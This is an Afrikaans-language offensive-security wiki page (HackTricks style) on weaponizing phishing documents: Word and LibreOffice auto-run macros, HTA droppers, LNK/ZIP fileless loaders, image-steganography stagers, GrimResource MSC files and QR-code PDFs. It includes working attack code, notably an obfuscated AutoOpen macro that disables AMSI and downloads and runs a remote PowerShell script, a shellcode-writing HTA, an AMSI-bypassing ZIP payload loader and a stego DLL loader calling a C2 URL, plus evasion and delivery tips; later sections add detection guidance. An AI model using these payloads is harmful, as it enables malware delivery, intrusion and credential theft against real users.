# Phishing-lêers en dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêerdatavalidering uit voordat ’n lêer oopgemaak word. Datavalidering word uitgevoer deur die datastruktuur volgens die OfficeOpenXML-standaard te identifiseer. As enige fout tydens die identifisering van die datastruktuur voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat makro’s bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die vermoë om makro’s uit te voer te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie makro’s nie, volgens ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer kan word en makro-uitvoering ondersteun.\
Dieselfde interne werking en meganismes geld vir alle sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sekere Office-programme uitgevoer gaan word:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-lêers wat na ’n afgeleë sjabloon verwys (Lêer –Opsies –Byvoegings –Bestuur: Sjablone –Gaan) wat macros insluit, kan ook macros “uitvoer”.

### Eksterne beeldlaai

Gaan na: _Invoeg --> Vinnige dele --> Veld_\
_**Kategorieë**: Skakels en verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever

![Office-dokumente - Eksterne beeldlaai: Gaan na: Invoeg -- Vinnige dele -- Veld](<../../images/image (155).png>)

### Macro-agterdeur

Dit is moontlik om macros te gebruik om arbitrêre kode vanuit die dokument uit te voer.

#### Outolaai-funksies

Hoe algemener hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Voorbeelde van macro-kode

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies die **Save as type**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie makro's in 'n `.docx` kan stoor nie** en daar 'n **stigma** **verbonde is aan** die makro-geaktiveerde **`.docm`**-uitbreiding (bv. die duimnael-ikoon het 'n groot `!` en sommige web-/e-pospoorte blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige makro-opwekkers

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT-outomatiese makro's (Basic)

LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties uitvoer wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te koppel (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk soos volg:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te escape, dus bly payloads wat eindig op `...==""")` gebalanseerd, met beide die innerlike opdrag en die Shell-argument.

Afleweringswenke:

- Stoor as `.odt` en koppel die macro aan die dokumentgebeurtenis sodat dit onmiddellik uitvoer wanneer die dokument oopgemaak word.
- Gebruik `--attach @resume.odt` wanneer jy met `swaks` e-pos stuur (die `@` is nodig sodat die lêer se bytes, en nie die lêernaamstring nie, as aanhegsel gestuur word). Dit is krities wanneer jy SMTP-bedieners misbruik wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

'n HTA is 'n Windows-program wat **HTML en skriptale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkings van 'n blaaier se sekuriteitsmodel.

'n HTA word met **`mshta.exe`** uitgevoer, wat gewoonlik saam met **Internet Explorer** **geïnstalleer** word; daarom is **`mshta` afhanklik van IE**. As IE dus gedeïnstalleer is, sal HTA's nie uitgevoer kan word nie.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Dwing NTLM-verifikasie af

Daar is verskeie maniere om **NTLM-verifikasie “op afstand” af te dwing**. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang sal kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **verifikasie sal aktiveer** wanneer hulle die vouer **bloot oopmaak**.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:

- [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-ingebedde Payloads (fileless-ketting)

Hoogs doeltreffende veldtogte lewer ’n ZIP-lêer wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader ná ’n unieke merker in die rou grepe van die ZIP-lêer gestoor is, en die .lnk dit uitsny en volledig in geheue uitvoer.<sup>[[2]](#references)</sup>

Tipiese vloei wat deur die .lnk PowerShell-eenreëlprogram geïmplementeer word:

1) Vind die oorspronklike ZIP-lêer in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouer vouer van die huidige werkgids.
2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-payload.
3) Kopieer die ZIP-lêer na %ProgramData%, pak dit daar uit en maak die lok- .docx oop om dit wettig te laat lyk.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskeer die volgende stadium (bv. verwyder alle #-tekens) en voer dit in geheue uit.

Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te sny en uit te voer:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notas
- Aflewering misbruik dikwels subdomeine van betroubare PaaS-platforms (bv. *.herokuapp.com) en kan toegang tot loonvragte beperk (bedien onskadelike ZIP-lêers op grond van IP/UA).
- Die volgende stadium dekripteer dikwels base64/XOR-shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfspore te beperk.

Volharding wat in dieselfde ketting gebruik word
- COM TypeLib-kaping van die Microsoft Web Browser-beheerkomponent, sodat IE/Explorer of enige toepassing wat dit insluit die loonvrag outomaties herbegin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-om-te-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers wat die ASCII-merkerstring bevat (bv. xFIQCV), wat aan die argiefdata geheg is.
- .lnk wat ouer-/gebruikervouers deurgaan om die ZIP op te spoor en ’n lokdokument oopmaak.
- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang besigheids-e-posdrade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## LNK-lokaas-eerste staging → scheduled-task-persistentie → vertroude CPL-side-loading

Nog ’n patroon wat herhaaldelik voorkom, is ’n **dokumentnabootsende `.lnk`** wat onmiddellik ’n onskadelike lokmiddel oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die kortpad **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n verduisterde PowerShell-aflaaier te begin.
2. PowerShell fragmenteer ooglopende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodat naïewe opsporing wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag mis.
3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en rekonstrueer dan die kwaadwillige lêers in die agtergrond.
4. Loonvragte kan met **rommeluitbreidings** geskryf en dan hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl`-artefakte vertraag.
5. Volharding word gevestig met ’n **minute-gebaseerde geskeduleerde taak** wat ’n vertroude gasheerbinêre lêer vanaf ’n gebruiker-skryfbare pad begin.

Minimale opsporingsaanwysings vir hierdie patroon:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

’n Nuttige staging-uitleg om te herken, is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium stealthy is

In die Rapid7-gevallestudie het die geskeduleerde taak **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan gestage is en **`RunFODW`** uitgevoer het, het die vertroude Microsoft-binêre die aanvaller se CPL side-loaded in plaas van die wettige stelselkopie.

Die CPL:
- Lees ’n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
- Dekripteer dit deur **Windows CNG / `bcrypt.dll`**
- Ken uitvoerbare geheue toe en kopieer die gedekripteerde shellcode daarin
- Voer dit indirek uit deur die shellcode-wyser as die terugroepfunksie vir **`EnumUILanguagesW`** deur te gee

Daardie laaste stap is afsonderlik die moeite werd om na te speur: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n terugroepfunksie aanvaar** om uitvoering oor te dra.

Die gedekripteerde loonvrag in hierdie veldtog was **Donut**-shellcode, wat daarna die finale PE volledig in die geheue gekarteer en **AMSI/WLDP/ETW** in die huidige proses reggemaak het voordat uitvoering oorgegee is. Vir meer besonderhede oor side-loading en naverwerking wat in die geheue plaasvind, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese leidrade om na te speur:
- `.lnk` wat `powershell.exe` of `conhost.exe` begin, gevolg deur ’n sigbare lokdokument.
- Kortstondige aflaaie na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf onsinnige lêeruitbreidings.
- Geskeduleerde take met onopvallende name soos `GoogleErrorReport` wat vanaf **skryfbare gebruikersgidse** uitgevoer word.
- Vertroude binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf word en daarna deur die side-loaded module gelees word.

## Steganografie-afgebakende loonvragte in beelde (PowerShell-stager)

Onlangse loader-kettings lewer ’n verdoeselde JavaScript/VBS af wat ’n Base64-PowerShell-stager dekodeer en uitvoer. Dié stager laai ’n beeld af (dikwels GIF) wat ’n Base64-gekodeerde .NET-DLL bevat wat as gewone teks tussen unieke begin-/eindmerkers versteek is. Die script soek na hierdie skeidingstekens (voorbeelde wat in die natuur gesien is: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die teks tussenin, dekodeer dit met Base64 na grepe, laai die assembly in die geheue en roep ’n bekende toegangspuntmetode met die C2-URL aan.<sup>[[5]](#references)</sup>

Werkvloei
- Stadium 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → begin PowerShell-stager met -nop -w hidden -ep bypass.
- Stadium 2: PowerShell-stager → laai beeld af, onttrek merker-afgebakende Base64, laai die .NET-DLL in die geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies.
- Stadium 3: Loader haal die finale loonvrag op en spuit dit tipies in via process hollowing in ’n vertroude binêre (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien meer oor process hollowing en proxy-uitvoering via vertroude nutsprogramme hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om ’n DLL uit ’n beeld te onttrek en ’n .NET-metode in die geheue aan te roep:

<details>
<summary>PowerShell-stego-loonvragonttrekker en -loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Dit is ATT&CK T1027.003 (steganografie/merkerverberging).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW-omseiling en string-deobfuskering word gewoonlik toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell-prosesse wat toegang tot beelde verkry en onmiddellik Base64-blobs dekodeer.

Sien ook stego-nutsgoed en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

’n Herhalende aanvanklike stadium is ’n klein, sterk verduisterde `.js`- of `.vbs`-lêer wat binne ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te inisialiseer.<sup>[[5]](#references)</sup>

Skematiese logika (abstrak):
- Lees die inhoud van die eie lêer
- Vind ’n Base64-blob tussen rommelstringe
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Opsporingsaanwysings
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf tydelike gebruikerpaadjies begin.

## MSC-dokumente as uitvoeringshouers (GrimResource)

Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat gewoonlik met `mmc.exe` oopgemaak word. **GrimResource** bewapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron wat ’n ou XSS-primitief bevat, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome monsters het obfuskering gebaseer op `transformNode` met **DotNetToJScript** gekombineer om ’n .NET-loonvrag te instansieer sonder die gewone Office-makropad.<sup>[[9]](#references)</sup>

Vir statiese triage moet ’n onbetroubare MSC as teks behandel word, en moet dit **nie** dubbelgeklik word nie:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Hoëseins-`runtime`-pivots is wanneer `mmc.exe` die CLR- of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer laat begin. Die formaat is wettig, daarom moet opsporings **oorsprong + verdagte XML-/script-inhoud + `mmc.exe`-gedrag** korreleer, eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>

## PDF-/QR-herleiers en payload-beheer

’n PDF het nie ’n exploit nodig om nuttig te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en pas die bestemming aan met die ontvanger se adres. Microsoft het PDF’s uit 2025 gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365-credential-harvesting-infrastruktuur gelei het; ’n parallelle ketting het IP-/omgewingsbeheer gebruik om ’n JavaScript-/MSI-pad aan geselekteerde besoekers te lewer, maar ’n onskuldige PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>

Beoordeel sowel PDF-aksies as QR-kodes wat weergegee is. ’n QR-kode kan vektorgebaseer geteken wees eerder as as ’n uittrekbare beeld gestoor word, daarom moet jy elke bladsy rasteriseer, benewens die uittrek van ingebedde beelde:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspekteer gedekodeerde bestemmings en herleidings vanaf ’n geïsoleerde ontledingstelsel sonder om te autentiseer. Nuttige soekkenmerke sluit in PDF’s wat slegs QR-kodes bevat met byna leë e-posboodskappe, die ontvanger se e-posadres wat in ’n navraagparameter ingebed is, verskeie herleidings deur betroubare gasheerdienste, en verskillende inhoud wat volgens IP-adres, geoligging, koekies, verwysingsbladsy of gebruikersagent teruggestuur word. Vergelyk versoeke met beheerde profiele, want ’n enkele sandbox-ophaalversoek kan slegs die lokinhoud ontvang.<sup>[[10]](#references)</sup>

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **plekke om NTLM-aanmeldbewyse te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde uitvissingaanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Opsporing van Dropping Elephant se handelsmetodes deur ’n China-tema-laaierketting](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuwe COM-volhardingstegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader lewer ’n verskeidenheid infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Uitvoering deur ’n instaanbediener met vertroude ontwikkelaarhulpmiddels: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedreigingsakteurs buit belastingseisoen uit om uitvisseryveldtogte met ’n belastingtema te loods](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
